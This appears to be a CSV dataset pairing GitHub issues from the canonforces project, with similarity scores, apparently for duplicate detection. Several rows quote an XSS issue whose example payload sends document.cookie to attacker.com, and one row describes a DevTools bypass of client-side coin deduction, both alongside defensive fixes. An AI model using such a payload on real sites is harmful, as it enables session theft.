repo,issue_1_number,issue_1_text,issue_2_number,issue_2_text,is_duplicate,cosine_similarity
OpenLake/canonforces,159,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements in 5 locations
## Issue

After reviewing the code, \`dangerouslySetInnerHTML\` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| \`src/pages/potd.tsx\` | 258 | \`formatDescription(truncatedDesc)\` |
| \`src/pages/questions/[id].tsx\` | 447-449 | \`formatDescription(ques.description)\` |
| \`src/pages/questions/[id].tsx\` | 458-460 | \`formatDescription(ques.input_format)\` |
| \`src/pages/questions/[id].tsx\` | 469-471 | \`formatDescription(ques.output_format)\` |
| \`src/components/ProblemOfTheDay.jsx\` | 8 | \`formatDescription(problem.description)\` |

### Attack Vector

If any problem description contains HTML with event handlers or script tags (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

\`\`\`html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
\`\`\`

### Fix

Install DOMPurify:
\`\`\`bash
npm install dompurify @types/dompurify
\`\`\`

Then sanitize before rendering:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Replace each:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
\`\`\`",58,"[HACKTOBERFEST] Style: Profile Page UI Redesign
# 🎨 UI/UX Improvement: Profile Page Redesign

## 📌 Description
The current **Profile Page UI** feels empty and unbalanced. Important user information (solved problems, followers, ratings) does not stand out, and there is excessive whitespace.  

### Current Issues:
- Stats (Solved, Followers, Following) are plain text and not visually highlighted.  
- Codeforces info is shown in a basic list format → lacks hierarchy.  
- Right-side illustration feels disconnected and does not add value.  
- Too much blank space makes the profile look unfinished.  

## ✅ Expected Improvements
- Enhance **profile header**: show cover/banner, profile picture, name, username more prominently.  
- Display **stats (Solved, Followers, Following, Ratings)** in styled cards or badges.  
- Redesign **Codeforces data** (rank, rating, max rating) → maybe with progress bars or colored badges matching Codeforces tiers.  
- Better alignment of right-side illustration, or replace it with something more functional (e.g., activity chart, recent submissions).  
- Add subtle **background styling** or separators to avoid the ""empty"" feel.  

## 📂 References / Inspiration
- LeetCode profile design  
- Codeforces profile sections  
- GitHub profile layout  

## 🧩 Impact
- Makes the **profile page more engaging**  
- Highlights achievements and encourages user motivation  
- Improves overall **UI/UX consistency** across Canonforces",,0.16008763015270233
OpenLake/canonforces,159,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements in 5 locations
## Issue

After reviewing the code, \`dangerouslySetInnerHTML\` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| \`src/pages/potd.tsx\` | 258 | \`formatDescription(truncatedDesc)\` |
| \`src/pages/questions/[id].tsx\` | 447-449 | \`formatDescription(ques.description)\` |
| \`src/pages/questions/[id].tsx\` | 458-460 | \`formatDescription(ques.input_format)\` |
| \`src/pages/questions/[id].tsx\` | 469-471 | \`formatDescription(ques.output_format)\` |
| \`src/components/ProblemOfTheDay.jsx\` | 8 | \`formatDescription(problem.description)\` |

### Attack Vector

If any problem description contains HTML with event handlers or script tags (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

\`\`\`html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
\`\`\`

### Fix

Install DOMPurify:
\`\`\`bash
npm install dompurify @types/dompurify
\`\`\`

Then sanitize before rendering:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Replace each:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
\`\`\`",57,"[HACKTOBERFEST] Bug : Profile Picture Not Displaying & Fallback Issue in Sidebar Suggestions
#  Bug Report: Profile Picture Not Displaying & Fallback Issue in Sidebar Suggestions

## 📌 Description
Two bugs have been noticed in the **""Suggestions for you""** sidebar:

1. **Profile pictures** are not rendering for users — all users show the default placeholder.  
2. **Invalid entries** (e.g., `Loading user info...`) appear in the list as if they were users.  


<img width=""30%""  alt=""Image"" src=""https://github.com/user-attachments/assets/f9883fa4-9f86-40d9-a61f-205805b7e7a6"" />

## 🔍 Steps to Reproduce
1. Open the homepage/dashboard where ""Suggestions for you"" sidebar is displayed.  
2. Observe:
   - User avatars are missing (placeholder only).  
   - Sometimes `""Loading user info...""` shows up as a suggestion item.  

## ✅ Expected Behavior
- Correct **profile pictures** should display for each user (fetched from database / provider).  
- If user info fails to load, show a **clean fallback** like:  
  - Skeleton loader, or  
  - Message: `""No suggestions available""`  

## 🚫 Actual Behavior
- Avatars not loading → only default placeholder is shown.  
- `""Loading user info...""` gets listed as a **fake user entry**.  

## 📸 Screenshots
_Attach screenshot for clarity (already attached in this issue)._  

## 🛠 Suggested Fix
- Debug avatar fetching logic (check DB/API field for profile image).  
- Implement a **better fallback** for invalid entries:  
  - Skeleton loader while fetching.  
  - Skip rendering invalid user objects instead of adding them to the list.  

## 📂 Additional Notes
- Check consistency between **sidebar** vs **profile page** avatars (maybe working in one place).  
- Ensure fallback works for both **empty list** and **failed fetch** scenarios.  

---
🔖 **Labels:** `bug`, `ui-ux`, `priority-medium`",,0.24921400845050812
OpenLake/canonforces,159,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements in 5 locations
## Issue

After reviewing the code, \`dangerouslySetInnerHTML\` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| \`src/pages/potd.tsx\` | 258 | \`formatDescription(truncatedDesc)\` |
| \`src/pages/questions/[id].tsx\` | 447-449 | \`formatDescription(ques.description)\` |
| \`src/pages/questions/[id].tsx\` | 458-460 | \`formatDescription(ques.input_format)\` |
| \`src/pages/questions/[id].tsx\` | 469-471 | \`formatDescription(ques.output_format)\` |
| \`src/components/ProblemOfTheDay.jsx\` | 8 | \`formatDescription(problem.description)\` |

### Attack Vector

If any problem description contains HTML with event handlers or script tags (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

\`\`\`html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
\`\`\`

### Fix

Install DOMPurify:
\`\`\`bash
npm install dompurify @types/dompurify
\`\`\`

Then sanitize before rendering:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Replace each:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
\`\`\`",56,"[HACKTOBERFEST] Style: Make Canonforces Logo Clickable for Dashboard Redirection
# 📝  Styling Improvement: Make Logo Clickable for Dashboard Redirection

## 📌 Overview
Update the **CanonForces logo/title** in the navigation bar to be **clickable** and redirect users to the **Dashboard/Homepage**.

## 🎯 Feature Details
- On clicking the **CanonForces title/logo** in the navbar:
  - Redirect user to the **Dashboard** (or Home Page if dashboard route not available).
- Maintain **consistent navigation** across the app.

## 🤔 Why?
- Improves **user experience** (UX) by aligning with common web app patterns.  
- Users naturally expect the logo to bring them back ""home"".  
- Reduces dependency on separate navigation buttons.  

## ✅ Acceptance Criteria
- [ ] Logo/Title is clickable.  
- [ ] Redirection works on all pages consistently.  
- [ ] No breaking changes to existing navbar design or routes.  

## 📂 Additional Notes
- Test across both **desktop & mobile views**.  
- Future extension: Consider adding hover effects for better UX feedback.",,0.03786098212003708
OpenLake/canonforces,159,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements in 5 locations
## Issue

After reviewing the code, \`dangerouslySetInnerHTML\` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| \`src/pages/potd.tsx\` | 258 | \`formatDescription(truncatedDesc)\` |
| \`src/pages/questions/[id].tsx\` | 447-449 | \`formatDescription(ques.description)\` |
| \`src/pages/questions/[id].tsx\` | 458-460 | \`formatDescription(ques.input_format)\` |
| \`src/pages/questions/[id].tsx\` | 469-471 | \`formatDescription(ques.output_format)\` |
| \`src/components/ProblemOfTheDay.jsx\` | 8 | \`formatDescription(problem.description)\` |

### Attack Vector

If any problem description contains HTML with event handlers or script tags (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

\`\`\`html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
\`\`\`

### Fix

Install DOMPurify:
\`\`\`bash
npm install dompurify @types/dompurify
\`\`\`

Then sanitize before rendering:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Replace each:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
\`\`\`",55,"[HACKTOBERFEST] Feature Request: Upcoming Contests Section
# 📝 Feature Request: Upcoming Contests Section

## 📌 Overview
Add a new **section on the Home Page** (can be placed anywhere as a separate block) to display **upcoming programming contests** from popular platforms like:
- Codeforces  
- LeetCode  
- CodeChef  
- AtCoder  

## 🎯 Feature Details
- A **dedicated section** that shows the next few contests with:
  - Contest **name**
  - **Date & time**
  - **Duration**
  - A **direct link** to participate/register
- Auto-fetch contests using APIs (e.g., [Kontests API](https://kontests.net/) or platform-specific APIs).
- Keep the UI **minimal & readable** (e.g., card layout / table view).

## 🤔 Why?
- Developers often miss contests → this keeps them **informed at a glance**.  
- Saves time instead of checking each platform individually.  
- Adds more **value** to the home page by mixing practice with real-world contests.  

## ✅ Acceptance Criteria
- [ ] Shows upcoming contests (at least from Codeforces & LeetCode).  
- [ ] Each contest entry has a link to the original contest page.  
- [ ] Data should auto-refresh (on reload / scheduled fetch).  

## 📂 Additional Notes
- Can later extend to other platforms (CodeChef, AtCoder, HackerRank).  
- Future idea: Allow **reminders/notifications** for contests.",,0.07381892204284668
OpenLake/canonforces,159,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements in 5 locations
## Issue

After reviewing the code, \`dangerouslySetInnerHTML\` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| \`src/pages/potd.tsx\` | 258 | \`formatDescription(truncatedDesc)\` |
| \`src/pages/questions/[id].tsx\` | 447-449 | \`formatDescription(ques.description)\` |
| \`src/pages/questions/[id].tsx\` | 458-460 | \`formatDescription(ques.input_format)\` |
| \`src/pages/questions/[id].tsx\` | 469-471 | \`formatDescription(ques.output_format)\` |
| \`src/components/ProblemOfTheDay.jsx\` | 8 | \`formatDescription(problem.description)\` |

### Attack Vector

If any problem description contains HTML with event handlers or script tags (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

\`\`\`html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
\`\`\`

### Fix

Install DOMPurify:
\`\`\`bash
npm install dompurify @types/dompurify
\`\`\`

Then sanitize before rendering:
\`\`\`tsx
import DOMPurify from 'dompurify';

// Replace each:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
\`\`\`",54,"[HACKTOBERFEST] Feature Request: Quiz System (AI-powered, Fullscreen, Timed)
# 📝 Feature Request: Quiz System (AI-powered, Fullscreen, Timed)

## 📌 Overview
Add a **Quiz System** where users can attempt **dynamic coding/DSA quizzes**.  
Questions may be generated using **AI APIs** or pulled dynamically from a problem set.

## 🎯 Feature Details
- Users can **start a quiz** → directly opens in **fullscreen mode** (immersive, no distractions).
- Each quiz will be **timed** (per question OR overall quiz).
- Questions should be **dynamic** (AI-generated / DB-driven).
- Show a **progress bar** or timer countdown during the quiz.
- End of quiz → **score summary** (correct/incorrect, accuracy, time spent).

## 🤔 Why?
- Makes practice **engaging & interactive**.
- Fullscreen mode = better **focus** during quizzes.
- AI-generated or dynamic questions = **infinite variety** of practice.

## ✅ Acceptance Criteria
- [ ] User clicks **Start Quiz** → fullscreen quiz begins immediately.  
- [ ] Timer runs automatically (global OR per-question).  
- [ ] Dynamic questions fetched (AI APIs / DB).  
- [ ] End of quiz screen with score & summary.  
- [ ] Exit fullscreen gracefully when quiz ends.  

## 📂 Additional Notes
- Could later expand to **topic-based quizzes** (Arrays, DP, Graphs, etc.).  
- Future: **Leaderboard / streak tracking** for gamification.",,0.07151623070240021
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",157,"XSS: dangerouslySetInnerHTML renders unsanitized problem statements
## Issue

After reviewing the code, `dangerouslySetInnerHTML` is used in **5 locations** to render problem descriptions that could come from Codeforces API, admin input, or other external sources.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| `src/pages/potd.tsx` | 258 | `formatDescription(truncatedDesc)` |
| `src/pages/questions/[id].tsx` | 447-449 | `formatDescription(ques.description)` |
| `src/pages/questions/[id].tsx` | 458-460 | `formatDescription(ques.input_format)` |
| `src/pages/questions/[id].tsx` | 469-471 | `formatDescription(ques.output_format)` |
| `src/components/ProblemOfTheDay.jsx` | 8 | `formatDescription(problem.description)` |

### Attack Vector

If any problem description contains HTML with `<script>` tags or event handlers (from Codeforces API, or an admin accidentally pasting HTML), it will execute in the browser:

```html
<img src=x onerror=""fetch('https://attacker.com/'+document.cookie)"">
```

### Fix

Install DOMPurify and sanitize before rendering:

```bash
npm install dompurify
```

```tsx
import DOMPurify from 'dompurify';

// Replace:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />

// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
```

This affects all 5 locations listed above. Same fix pattern applies to each.",,0.20583251118659973
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",156,"XSS vulnerability: dangerouslySetInnerHTML renders unsanitized problem content
## 🔍 Issue

Multiple components use `dangerouslySetInnerHTML` to render problem descriptions, input/output formats, and editorial content **without sanitizing user-controlled HTML**.

### Affected Files

| File | Line | What's Rendered |
|------|------|----------------|
| `src/pages/potd.tsx` | 258 | `formatDescription(truncatedDesc)` — Problem of the Day description |
| `src/pages/questions/[id].tsx` | 447-448 | `formatDescription(ques.description)` — Full problem description |
| `src/pages/questions/[id].tsx` | 458-459 | `formatDescription(ques.input_format)` — Input format section |
| `src/pages/questions/[id].tsx` | 469-470 | `formatDescription(ques.output_format)` — Output format section |
| `src/components/ProblemOfTheDay.jsx` | 8 | Problem description in card view |

### Attack Vector

If any problem description is sourced from a competitive programming API (CodeChef, Codeforces, AtCoder) and a third party can inject HTML into the description (e.g., through a crafted problem statement), they could:
- Execute arbitrary JavaScript in the viewer's browser
- Steal session cookies or auth tokens
- Redirect users to phishing pages

### 💡 Fix Options

**Option A — DOMPurify (recommended):**
```tsx
import DOMPurify from 'dompurify';
// Replace:
<div dangerouslySetInnerHTML={{ __html: formatDescription(desc) }} />
// With:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(formatDescription(desc)) }} />
```

**Option B — Markdown parser:**
If descriptions are primarily markdown, switch to `react-markdown` which sanitizes by default:
```tsx
import ReactMarkdown from 'react-markdown';
<ReactMarkdown>{formatDescription(desc)}</ReactMarkdown>
```

### Priority
**High** — This is a known CWE-79 (Cross-Site Scripting) vulnerability pattern.",,0.18188798427581787
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",144,"Bug: Run and Submit buttons are not visible in the IDE
# [Bug]: Run and Submit buttons are not visible in the IDE

## Bug Description
The ""Run"" and ""Submit"" buttons are missing from the IDE interface on the problem page. Users are unable to execute their code or submit their solutions, rendering the editor non-functional. The ""Output"" panel displays the text ""Run your code to see the output here,"" but the mechanism to trigger this action is absent.

## 📸 Screenshots

<img width=""70%"" alt=""Image"" src=""https://github.com/user-attachments/assets/789dfd42-f4e4-4818-b5a0-bce17355e130"" />

## STEPS TO REPRODUCE
1. Go to any problem page (e.g., ""Line Trip"").
2. Navigate to the code editor section on the right side.
3. Observe the bottom toolbar and editor header.
4. **Result:** The ""Run"" and ""Submit"" buttons are not visible.

## Expected Behavior
There should be clearly visible ""Run"" and ""Submit"" buttons (likely located at the bottom-right of the editor or within the control bar) to allow users to test and submit their code.

## 🏷️ Labels
`bug` `ui/ux` `critical`",,0.09172961115837097
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",140,"Update footer on home route & add social links
## 🐞 Describe the Bug

The footer on home page is not updated to year 2026 & social links are so not linked.

<img width=""1335"" height=""370"" alt=""Image"" src=""https://github.com/user-attachments/assets/bd962a41-beed-4044-b3a6-cc51e31f2f8b"" />",,-0.017075061798095703
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",138,"Login Flow was Not Working
Hi @aviralsaxena16  

When I Try to Login By Using Google After Authenication it was going to the SignUp form Without going to dashboard and If I Change the Link from /signup to /dashboard it was Opening 

I am Interested to Fix this Issue and Go with Minor Changes in that UI with your Permission .
I hope you will  Assign me PR 

Thank You",,0.07211051881313324
OpenLake/canonforces,158,"Client-side coin deduction allows unlimited free hints — integrity bypass
## Issue

In `src/pages/questions/[id].tsx`, the hint system does all coin logic client-side:

```tsx
const HINT_COST = 10;
// Coins are deducted via Firestore from the browser
```

### Problem

Since this is entirely client-side:
1. Open DevTools -> set `HINT_COST = 0`
2. Get unlimited hints for free
3. Can use Firebase SDK to directly modify coin balance

### Fix

Move coin operations to a server-side endpoint (Firebase Cloud Function or API server):

```typescript
// Client sends request
const response = await fetch('/api/hints', {
  method: 'POST',
  body: JSON.stringify({ questionId, hintLevel })
});

// Server handles:
// 1. Verify auth token
// 2. Read user's current coins from Firestore
// 3. Check coins >= HINT_COST
// 4. Atomically deduct coins and return hint
// 5. Prevent client from specifying the cost
```

Also audit all Firestore write operations in `potd.tsx` and `questions/[id].tsx` — any state change (streak updates, solve counts, leaderboard positions) should be validated server-side.",136,"[FOSSOVERFLOW-25] Feat: Gamification System - Dynamic POTD with Admin selection, Streaks and Global Leaderboards section
# 🚀 Feature Request: Gamification System & Unified Leaderboards

## 📝 Description
We are overhauling CanonForces with a complete **Gamification System**. This ""Epic"" issue combines the upgrades for the **Problem of the Day (POTD)** logic with a brand new **Global Leaderboard** page.

The goal is to drive user retention through **Daily Streaks**, **Coin Rewards**, and competitive **Rankings**.

> **Note:** ""Today's Solvers"" list for POTD is already implemented. You do not need to rebuild that. Your focus is on the *new* logic (Streaks, Admin Tools, Weekly POTD stats) and the *separate* Global Leaderboard page.

## 🎯 Key Features & Requirements

### Part 1: Dynamic POTD & Streak System
**Location:** `/potd` page

1. **Admin Manual Selection (Override):**
   - **Current Logic:** Randomly picks a problem.
   - **New Logic:** Create an Admin-only interface to manually set a Codeforces Problem ID/Link for a specific date.
   - **Fallback:** If no manual problem is set, the system defaults to the existing random picker.

2. **Daily Streak Logic:**
   - **Goal:** Gamify consistency.
   - **Logic:**
     - If a user solves the POTD today, increment their `currentStreak` by +1.
     - If a user misses a day (didn't solve yesterday's POTD), their streak resets to 0 (or 1, upon solving today's).
   - **Display:** Show the streak count prominently on the User Dashboard.

3. **Coin Rewards:**
   - Successfully solving the POTD should reward the user with **Coins** (e.g., +10 Coins).
   - Update the user's `coinBalance` in Firebase.

4. **Local POTD Leaderboard (Weekly):**
   - Create a small leaderboard *specifically* for the POTD section.
   - **Metric:** Users with the highest POTD streak or most POTD solves **this week**.
   - **Reset:** Logic to filter or reset this view weekly.

### Part 2: Global Leaderboard Section
**Location:** New `/leaderboard` page

1. **Dual Ranking Views:**
   - **Top Earners:** Rank users by `totalCoins` (descending).
   - **Top Solvers:** Rank users by `totalProblemsSolved` (descending).
   - **UI:** Tabs/Toggle to switch between these two views.

2. **User List UI:**
   - Display Top 50 users.
   - **Row Data:** Rank (1, 2), Avatar, Username, Metric Value (Coins/Solved Count), and Streak Icon.

3. **""My Rank"" Sticky Footer:**
   - If the logged-in user is **not** in the Top 50, show a sticky bar at the bottom displaying *their* specific rank and score relative to the leaders.

## 🛠️ Technical Implementation
- **Stack:** Next.js, Firebase (Firestore).
- **Database Updates:**
  - `users` collection: Add fields `currentStreak`, `lastPotdDate`, `totalCoins`.
  - `potd_schedule` collection: For Admin selections.
- **Logic:**
  - Reuse the existing `checkSubmission` helper for Codeforces verification.
  - Ensure Firestore indexes are created for `orderBy('totalCoins', 'desc')` and `orderBy('totalProblemsSolved', 'desc')`.

## ✅ Acceptance Criteria
- [ ] Admin can manually set the POTD; system falls back to random if unset.
- [ ] User's streak increments on solve and resets on miss.
- [ ] User receives Coins for solving POTD.
- [ ] **POTD Page:** Shows a ""Weekly Top Solvers"" list.
- [ ] **Global Leaderboard Page:** Shows ""Top Coin Earners"" and ""Top Problem Solvers"" tabs.
- [ ] ""My Rank"" footer appears for users outside the top list.

## 🏷️ Labels
`Foss Overflow` `backend` `frontend` `gamification` `database`",,0.19196036458015442
